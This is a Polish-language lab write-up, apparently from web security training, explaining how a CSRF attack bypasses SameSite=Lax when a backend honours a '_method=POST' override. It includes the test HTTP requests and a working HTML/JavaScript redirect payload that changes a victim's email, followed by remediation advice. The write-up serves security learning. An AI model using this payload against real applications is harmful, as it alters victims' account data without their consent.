# Lab 03 - SameSite Lax Bypass via Method Override

Topic: Zachowanie cookies w przeglądarce i niebezpieczny method override  
Focus: zrozumienie, jak `SameSite=Lax` może zostać obejście, gdy backend akceptuje `_method=POST`

## Goal

Wykonać atak CSRF w legalnym labie i zmienić adres email ofiary mimo działania SameSite `Lax`.

## Input I Controlled

Kontrolowane inputy:

- parametr query `email`,
- parametr query `_method`,
- URL przekierowania hostowany na exploit serverze.

## Co się stało

Normalny request zmiany emaila używał `POST`:

```http
POST /my-account/change-email
Cookie: session=...

email=wiener1%40normal-user.net
```

Bezpośredni `GET` nie działał:

```http
GET /my-account/change-email?email=test-lax-1%40example.com
```

Serwer odpowiedział:

```http
405 Method Not Allowed
Allow: POST
```

Następnie przetestowałem method override:

```http
GET /my-account/change-email?email=test-lax-2%40example.com&_method=POST
```

Odpowiedź:

```http
302 Found
Location: /my-account?id=wiener
```

Email się zmienił, co pokazało, że backend zaakceptował `_method=POST`.

Finalny exploit użył top-level navigation:

```html
<html>
  <body>
    <script>
      document.location = "https://LAB-HOST/my-account/change-email?email=samesite-lax-92831@example.com&_method=POST";
    </script>
  </body>
</html>
```

## Czego się nauczyłem

SameSite `Lax` nie oznacza, że CSRF jest niemożliwy.

Przy `SameSite=Lax` przeglądarka może wysłać cookies podczas top-level navigation typu `GET`. Jeśli backend potraktuje ten `GET` jako `POST` przez `_method=POST`, atakujący może wywołać akcję zmieniającą stan.

Kluczowa różnica:

- przeglądarka widzi top-level `GET`,
- backend traktuje request jako `POST`.

## Wpływ

W prawdziwej aplikacji niebezpieczny method override mógłby pozwolić atakującemu obejść oczekiwane zachowanie `SameSite=Lax` i wykonać akcję zmieniającą stan jako ofiara.

Impact zależy od endpointu. Dla ustawień konta mogłoby to oznaczać niechciane zmiany danych użytkownika.

## Podsumowanie remediacji

Zobacz `../overview.md` dla ogólnej sekcji remediation.

Specyficznie dla tego laba:

- nie pozwalać na method override przy wrażliwych endpointach zmieniających stan,
- wymagać poprawnych CSRF tokenów nawet wtedy, gdy używane jest SameSite,
- unikać zmian stanu przez top-level `GET`,
- traktować SameSite jako defence-in-depth, nie zamiennik CSRF tokenów,
- sprawdzić framework-level method override behaviour.

## Główna lekcja

SameSite `Lax` pomaga, ale nie jest pełną ochroną CSRF. Zachowanie backendu, takie jak method override, może zamienić dozwoloną przez przeglądarkę nawigację `GET` w akcję zmieniającą stan.
